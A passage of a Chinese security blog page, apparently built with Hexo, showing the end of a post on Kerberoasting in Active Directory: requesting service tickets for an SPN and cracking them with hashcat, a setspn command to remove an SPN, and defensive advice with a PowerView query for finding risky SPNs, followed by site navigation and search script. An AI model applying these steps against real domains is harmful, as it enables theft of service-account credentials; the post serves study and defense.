+<p><img src="3-1.png" alt="Alt text"></p>
+<p>在域内任意一台主机都能获得该SPN，并且能够使用Kerberoast获得TGS，如下图</p>
+<p><img src="3-2.png" alt="Alt text"></p>
+<p>再使用hashcat破解即可</p>
+<p><strong>补充：</strong></p>
+<p>删除SPN的参数如下：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn<span class="selector-class">.exe</span> -D VNC/DC1<span class="selector-class">.test</span><span class="selector-class">.com</span> Administrator</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x07-防御"><a href="#0x07-防御" class="headerlink" title="0x07 防御"></a>0x07 防御</h2><hr>
+<p>Kerberoasting攻击的主要前提是口令复杂度较低、 加密算法强度较弱</p>
+<p>对抗Kerberoasting攻击也需从这2方面开展:</p>
+<ul>
+<li>提高服务账号的口令复杂度；</li>
+<li>尽量将域内的服务器系统升级至少至Windows 2008 系统，应用AES256高难度的加密算法.</li>
+</ul>
+<p>管理员可在域内一台主机上使用Invoke-Kerberoast检查是否存在危险的SPN</p>
+<p>下载地址：</p>
+<p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p>
+<p>参数：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Get</span>-NetUser -spn -AdminCount|<span class="keyword">Select</span> <span class="type">name</span>,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/" rel="next" title="DCSync与DCshadow攻击学习">
+                <i class="fa fa-chevron-left"></i> DCSync与DCshadow攻击学习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/header.jpg"
+                alt="Shu1L" />
+            
+              <p class="site-author-name" itemprop="name">Shu1L</p>
+              <p class="site-description motion-element" itemprop="description">欢迎来到Shu1L的神秘小屋！</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">54</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">35</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="http://xun9er.com/" target="_blank" title="xun9er">
+                      
+                        <i class="fa fa-fw fa-globe"></i>xun9er</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://hack-for.fun/" target="_blank" title="M0nk3y">
+                      
+                        <i class="fa fa-fw fa-globe"></i>M0nk3y</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://106.15.121.121/" target="_blank" title="ttpfx">
+                      
+                        <i class="fa fa-fw fa-globe"></i>ttpfx</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.cnblogs.com/lyxf/" target="_blank" title="l0gan">
+                      
+                        <i class="fa fa-fw fa-globe"></i>l0gan</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://www.mythe.top/" target="_blank" title="mythe">
+                      
+                        <i class="fa fa-fw fa-globe"></i>mythe</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://cyzcc.vip/" target="_blank" title="cyzCc">
+                      
+                        <i class="fa fa-fw fa-globe"></i>cyzCc</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.d0g3.cn/" target="_blank" title="道格安全研究实验室">
+                      
+                        <i class="fa fa-fw fa-globe"></i>道格安全研究实验室</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#kerberosating攻击学习"><span class="nav-number">1.</span> <span class="nav-text">kerberosating攻击学习</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#前言"><span class="nav-number">1.0.1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基础知识"><span class="nav-number">1.1.</span> <span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#kerberos协议认证"><span class="nav-number">1.1.1.</span> <span class="nav-text">kerberos协议认证</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SPN（ServicePrincipal-Names-服务主体名称"><span class="nav-number">1.1.2.</span> <span class="nav-text">SPN（ServicePrincipal Names)服务主体名称</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-使用SetSPN"><span class="nav-number">1.1.2.0.1.</span> <span class="nav-text">(1) 使用SetSPN</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#简述Kerberosating攻击"><span class="nav-number">1.1.3.</span> <span class="nav-text">简述Kerberosating攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#选择SPN服务账号的原因"><span class="nav-number">1.1.3.1.</span> <span class="nav-text">选择SPN服务账号的原因</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#攻击流程"><span class="nav-number">1.1.3.2.</span> <span class="nav-text">攻击流程</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#实现Kerberoasting攻击的前提"><span class="nav-number">1.1.3.3.</span> <span class="nav-text">实现Kerberoasting攻击的前提</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Kerberoasting攻击的利用"><span class="nav-number">1.1.4.</span> <span class="nav-text">Kerberoasting攻击的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#使用-Rubeus工具"><span class="nav-number">1.1.4.1.</span> <span class="nav-text">使用 Rubeus工具</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1、获得有价值的SPN"><span class="nav-number">1.1.4.2.</span> <span class="nav-text">1、获得有价值的SPN</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-使用powershell模块Active-Directory"><span class="nav-number">1.1.4.3.</span> <span class="nav-text">(1)使用powershell模块Active Directory</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-使用PowerView"><span class="nav-number">1.1.5.</span> <span class="nav-text">(2)使用PowerView</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-使用kerberoast"><span class="nav-number">1.1.6.</span> <span class="nav-text">(3)使用kerberoast</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、请求TGS"><span class="nav-number">1.2.</span> <span class="nav-text">2、请求TGS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-请求指定TGS"><span class="nav-number">1.2.1.</span> <span class="nav-text">(1)请求指定TGS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-请求所有TGS"><span class="nav-number">1.2.2.</span> <span class="nav-text">(2)请求所有TGS</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3、导出"><span class="nav-number">1.3.</span> <span class="nav-text">3、导出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4、破解"><span class="nav-number">1.4.</span> <span class="nav-text">4、破解</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-Kerberoasting的实现方法二"><span class="nav-number">2.</span> <span class="nav-text">0x05 Kerberoasting的实现方法二</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-Kerberoasting的后门利用"><span class="nav-number">3.</span> <span class="nav-text">0x06 Kerberoasting的后门利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-防御"><span class="nav-number">4.</span> <span class="nav-text">0x07 防御</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Shu1L</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three-waves.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
